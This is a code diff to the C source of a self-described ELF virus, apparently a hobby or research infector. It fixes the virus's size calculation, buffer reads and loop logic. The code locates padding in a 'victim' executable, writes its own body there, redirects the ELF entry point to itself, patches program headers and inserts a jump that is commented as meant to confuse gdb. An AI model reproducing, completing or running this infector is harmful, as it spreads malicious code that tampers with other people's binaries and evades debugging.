@@ -119,7 +119,7 @@ static inline void memcpy(long src_addr, long dst_addr, long size)
 	}
 }
 
-void _start(void) __attribute__((aligned(16)));
+void _start(void) __attribute__((aligned(16), section(".text")));
 void _start(void)
 {
 label1: ;
@@ -133,6 +133,9 @@ label1: ;
 	Elf64_Half p;
 	unsigned char jmp[19];
 
+	/* Count size of _start function of virus */
+	real_code_size = (long)&&label2 - (long)&_start;
+	code_size = 2048;
 	a[0] = 'a';
 	a[1] = 'a';
 	a[2] = 'a';
@@ -159,13 +162,9 @@ label1: ;
 	for (p = 0; p < ehdr.e_phnum; ++p) {
 		read(fd, &phdr, sizeof(phdr));
 		if (phdr.p_type != PT_LOAD) { continue; }
-		read(fd, &phdr_next, sizeof(phdr));
+		read(fd, &phdr_next, sizeof(phdr_next));
 
-		/* Count size of _start function of virus */
-		code_size = 2048;
-		real_code_size = &&label2 - &&label1;
-
-		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz) >= real_code_size)) {
+		if (((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz)) >= real_code_size)) {
 			/* Padding in victim */
 			offset = phdr.p_offset + phdr.p_filesz;
 			lseek(fd, offset, SEEK_SET);
@@ -196,7 +195,6 @@ label1: ;
 			 * as a side effect it generates jump inside
 			 * instruction so it mess gdb :) */
 			memcpy((long)&(ehdr.e_entry), (long)&(jmp[2]), 8); 
-			lseek(fd, 7, SEEK_CUR);
 			write(fd, jmp, sizeof(jmp));
 
 			/* change elf header entry point */
@@ -209,9 +207,8 @@ label1: ;
 			phdr.p_memsz += code_size;
 			lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
 			write(fd, &phdr, sizeof(phdr));
+			break;
 		}
-
-		break;
 	}	
 	close(fd);
 	_exit(0);
